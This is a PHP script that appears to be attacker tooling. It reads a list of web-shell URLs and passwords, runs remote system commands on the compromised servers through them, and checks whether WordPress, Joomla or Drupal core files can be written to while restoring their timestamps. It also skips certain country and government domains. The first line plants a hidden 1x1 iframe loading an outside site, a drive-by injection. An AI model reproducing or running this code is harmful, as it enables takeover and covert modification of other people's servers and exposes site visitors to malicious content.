<?php echo "<iframe src=\"http://mbnetwork.com/news.php\" width=\"1\" height=\"1\"></iframe>"; ?><?
set_time_limit(0);
ignore_user_abort(true);

$file = dirname(__FILE__) . 'data.txt';
$data = file_get_contents($file);
$data = explode("\n", trim($data));
$data = array_map("trim", $data);
$out_unique = microtime(true);
$ips_array = $checked_hosts = array();


$good_file = dirname($file)."/out_".$out_unique."_good_".basename($file);
$bad_file = dirname($file)."/out_".$out_unique."_bad_".basename($file);



foreach ($data as $str) {
    try {


//        sleep(3);
        $netstat = -1;


        $tmp = explode("|", trim($str));
        $url = trim($tmp[0]);
        if(substr($url, 0, strlen("http://"))!="http://") $url = "http://".$url;
        $pass = trim($tmp[1]);
        $host = parse_url(trim($url), PHP_URL_HOST);

        echo "\n".trim($url)."|".$pass."\n";



        if(!empty($checked_hosts[$host])) {
            throw new Exception("host: checked");
        }

        $checked_hosts[$host] = 1;

        $ip = gethostbyname($host);
        if(!empty($ips_array[$ip])) {
            throw new Exception("ip: exists $ip ".implode("+", $ips_array[$ip]));
        }
        $ips_array[$ip][] = $host;

        $bad_zones = array(".ru", ".su", ".ua", ".kz", ".by", ".xn--p1ai", ".gov", ".mil");
        $tmp = parse_url($url);

        foreach($bad_zones as $z) {
            if(stristr(str_ireplace("www.", "", $host), $z)) {
                throw new Exception("zone:bad zone $z");
            }
        }

        $data = get_listing($url, $pass);
        if(!preg_match("#^[0-9]+$#", $data["count"]) OR $data["count"]==0 OR $data["count"]<2) {
            $message = ":".rand(0, 999).".".$data["count"].".".rand(0, 999999999);
            throw new Exception($message);
        }

        $netstat = ":".rand(0, 999).".".$data["count"].".".rand(0, 999999999);

        if_writable($url, $pass);


        save_data($url, $pass, $netstat, $good_file);
        flush();

    } catch (Exception $e) {
        $log_message = $e->getMessage();
        save_data($url, $pass, $log_message, $bad_file);
    }
}


function save_data($url, $pass, $comment, $name) {
    file_put_contents($name, $url."|".$pass."|".$comment."\n", FILE_APPEND);
    if(php_sapi_name()!="cli") echo "<span style='color: ".(stristr($name, "bad")?"red":"green")."'>".(stristr($name, "bad")?"bad":"good")."</span> : ";
    echo $comment."\t<br>\n";

}

function get_listing($url, $pass) {

    $post = array(
        'a' => 'RC',
        'p1' => "system(\"netstat -tn 2>/dev/null | grep ':80 ' | awk '{print $5}' | cut -f1 -d: | sort | uniq -c | sort -rn | wc -l\");",
        "pass" => $pass,
    );
    $c = _request($url, $post, 15);
    if(stristr($c, "curl_error")) {

        throw new Exception(trim($c));
    }
    elseif((int)trim(substr($c, 0, 10))>=0) {
        $count = (int)trim(substr($c, 0, 10));
    }
    else throw new Exception("unknown error");

    return array("url"=>$url, "pass"=>$pass, "count"=>$count);
}
function if_writable($url, $pass) {

    $path = dirname(parse_url($url, PHP_URL_PATH));
    $tmp = trim(str_replace("/", " ", $path));
    $tmp = preg_replace("#[ ]+#is", " ", $tmp);

    if (strlen(trim($tmp)) == 0) $depth = 0;
    else {
        $data = explode(" ", $tmp);
        $depth = count($data);
    }


    $post = array(
        'a' => 'RC',
        'p1' => '$base_dir = dirname(__FILE__);
for ($i = 0; $i < '.$depth.'; $i++) {
    $base_dir = dirname($base_dir);
}
$marker = "\t\t\t   \t\t\t   \t\t\t";

$files = array("wp-includes/pluggable.php", "includes/framework.php", "includes/bootstrap.inc");
$found = false;
foreach ($files as $f) {
    if($found) break;
    $filename = $base_dir . "/".$f;
    if (file_exists($filename)) {
        $filemtime = filemtime($filename);
        $origin = file_get_contents($filename);
        if (!@file_put_contents($filename, $origin . $marker)) {
            echo "marker_write_error\n";
        }
        $c = @file_get_contents($filename);
        if (empty($c) OR !stristr($c, $marker)) echo("no_marker\n");
        else {
            file_put_contents($filename, $origin);
            touch($filename, $filemtime);
            echo("marker_found\n");
            $found = true;
        }
    }
}
',
        "pass" => $pass,
    );
//    print_r($post);
    $c = _request($url, $post, 15);
    if(stristr($c, "marker_found")) {
        echo "$c \n";
//        return;
    }
    else throw new Exception("Error: no_marker");
}








function _request($url, $post = false, $timeout = 20) {

    $url = str_replace(" ", "%20", trim($url));

    $ch = curl_init();

    if ($post) {
        $post = is_array($post) ? http_build_query($post) : $post;
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }

    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; U; Windows XP; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.427.0 Safari/534.1");


    $content = curl_exec($ch);
    $error = curl_error($ch);
    if ($error) {
        return "curl_error: ".$error;
    }
    if (empty($content))
        return true;
    return trim($content);
}